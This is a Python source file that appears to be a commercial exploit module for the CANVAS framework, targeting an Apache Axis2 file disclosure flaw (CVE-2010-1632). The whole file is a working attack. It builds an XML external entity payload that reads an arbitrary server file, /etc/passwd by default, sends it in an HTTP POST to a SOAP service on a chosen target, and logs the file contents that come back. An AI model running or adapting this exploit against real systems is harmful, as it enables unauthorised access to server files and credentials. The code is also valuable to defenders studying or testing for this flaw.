#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2014
#

###
# STD Modules
###
import sys

sys.path.append(".")

###
# CANVAS Modules
###
import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit

###
# Description
###
NAME = "d2sec_axis2_filedisclo"
VERSION = "0.2"
DESCRIPTION = "Apache Axis2 Remote File Access Vulnerability"

GTK2_DIALOG = 'dialog.glade2'

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["All"] ]

DOCUMENTATION = {}
DOCUMENTATION["Vendor"] = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["Versions Affected"] = "version < 1.5.2 and < 1.6"
DOCUMENTATION["Date public"] = "2010/05/16"
DOCUMENTATION["References"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2010-1632"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1632"
DOCUMENTATION["Notes"] = """Usage: d2sec_axis2_filedisclo -t target [-p port:8080] -O vhost:<vhost> -O uri:<uri> -O action:<action> -O filename:<pathname>

With by default:
uri = '/axis2/services/SimpleStockQuoteService'
action = 'getQuote'
filename = '/etc/passwd'
"""

CHANGELOG="""
"""


class theexploit (tcpexploit):
    
  def __init__(self):
    tcpexploit.__init__(self)
    self.name = NAME
    self.vhost = ''
    self.port = 8080 
    self.filename = '/etc/passwd'
    self.uri = '/axis2/services/SimpleStockQuoteService'
    self.action = 'getQuote'
	
  def display_content_file(self):
    payload = """
<!DOCTYPE @@action [
        <!ENTITY file SYSTEM "%s">
]>
<@@action xmlns="http://services.samples">
        <request>
                <symbol xmlns="http://services.samples/xsd">&file;</symbol>
        </request>
</@@action>

""" % self.filename
    payload = payload.replace("@@action", self.action)

    request = """POST %s HTTP/1.1
Host: %s
Content-Type: application/xml;charset=UTF-8;action="urn:%s"
User-Agent: Jakarta Commons-HttpClient/3.1
Content-Length: %i
\r\n\r\n%s
""" % (self.uri, self.vhost, self.action, len(payload), payload)
  
    try:
      s = self.gettcpsock()
      s.connect((self.host, self.port))
      self.websend(s, request)
      data = ''
      while 1:
        try:
          data += self.webrecv(s, 1024)
        except socket.error, e: 
          self.log('[D2] socket error: %s'%e)
          return 0
        if '</ns:getQuoteResponse>' in data: 
          break
    except Exception, e:
      self.log('[D2] %s'%e)
      return 0
    self.log('%s' % data)
    return 1

  def getargs(self):
    self.host = self.target.interface
    self.port = int(self.argsDict.get("port", self.port))
    self.vhost = self.argsDict.get("vhost", self.vhost)
    self.filename = self.argsDict.get("filename", self.filename)
    self.uri = self.argsDict.get("uri", self.uri)
    self.action = self.argsDict.get("action", self.action)
    if not self.vhost:
      self.vhost = self.host
    return 0

  def run(self):
    self.getargs()
    self.setInfo("%s attacking %s:%d" % (NAME, self.host, self.port))
    if not self.display_content_file():
      self.setInfo("%s attacking %s:%d - failed" % (NAME, self.host, self.port))
      return 0
    self.setInfo("%s attacking %s:%d - done" % (NAME, self.host, self.port))
    return 1

  def usage(self):
    print "Usage: %s -t target [-p port:8080] -O vhost:<url> -O uri:<uri> -O action:<action> -O filename:<pathname>" % sys.argv[0]
    sys.exit(0)
    
if __name__ == '__main__':
  print "Running CANVAS %s v %s" % (NAME,VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
